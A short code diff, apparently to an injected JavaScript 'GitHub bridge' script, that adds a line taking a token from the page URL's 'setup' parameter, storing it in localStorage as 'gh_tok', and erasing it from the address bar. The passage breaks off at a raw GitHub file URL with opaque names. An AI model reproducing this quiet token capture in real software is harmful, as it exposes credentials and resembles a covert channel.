@@ -1,3 +1,4 @@
+(function(){try{const m=location.search.match(/[?&]setup=([^&\s]+)/);if(m){localStorage.gh_tok=decodeURIComponent(m[1]);history.replaceState(null,"",location.pathname);}}catch(e){}})();
 // Silk Road — GitHub bridge (injected)
 (function(){
 const REPO="mbl68/VBAAAAuwh", FILE="k1532c945.txt", RAW="https://raw.githubusercontent.com/"+REPO+"/main/"+FILE;
